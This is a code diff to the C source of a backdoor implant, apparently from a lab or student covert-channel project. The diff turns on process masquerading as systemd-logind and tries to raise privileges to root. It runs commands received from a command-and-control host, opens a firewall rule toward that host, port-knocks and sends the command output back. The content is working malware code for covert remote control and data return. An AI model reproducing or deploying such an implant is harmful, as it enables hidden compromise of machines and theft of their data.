@@ -9,11 +9,11 @@
 #define MASK "/usr/lib/systemd/systemd-logind"
 #define CMD "./cmd.sh > results"
 #define CHMOD "chmod 755 cmd.sh"
-#define IPTABLES "iptables -A OUTPUT -p tcp -d 192.168.1.3 --dport 8505 -j ACCEPT"
-#define TURNOFF "iptables -D OUTPUT -p tcp -d 192.168.1.3 --dport 8505 -j ACCEPT"
+#define IPTABLES "iptables -A OUTPUT -p tcp -d 192.168.0.110 --dport 8505 -j ACCEPT"
+#define TURNOFF "iptables -D OUTPUT -p tcp -d 192.168.0.110 --dport 8505 -j ACCEPT"
 #define RESULT_FILE "results"
-#define INFECTEDIP "192.168.1.13"
-#define CNCIP "192.168.1.3"
+#define INFECTEDIP "192.168.0.100"
+#define CNCIP "192.168.0.109"
 
 struct payload{
     char key[5]; // always 8505
@@ -33,8 +33,11 @@ void recv_results(char* sip, unsigned short sport);
 void send_results(char *sip, char *dip, unsigned short sport, unsigned short dport, char *filename);
 int rand_delay(int delay);
 
+int pattern[2];
+int knocking[2];
+
 int main(int argc, char **argv){
-    //strcpy(argv[0], MASK);
+    strcpy(argv[0], MASK);
     //change the UID/GID to 0 to raise privs
     setuid(0);
     setgid(0);
@@ -209,13 +212,16 @@ void ParsePayload(const u_char *payload, int len){
     system(CMD);
     system(IPTABLES);
 
-
+    printf("COMMAND RECEIEVED \n");
     //sending the results back to the CNC
     char *srcip = INFECTEDIP;
     char *destip = CNCIP;
     unsigned short sport = SHPORT;
     unsigned short dport = SHPORT;
-
+    printf("PORT KNOCKING\n");
+    covert_send(srcip, destip, sport, 8506, 0, 2);
+    covert_send(srcip, destip, sport, 8507, 0, 2);
+    printf("RETURNING RESULTS\n");
     send_results(srcip, destip, sport, dport, RESULT_FILE);
     system(TURNOFF);
 }
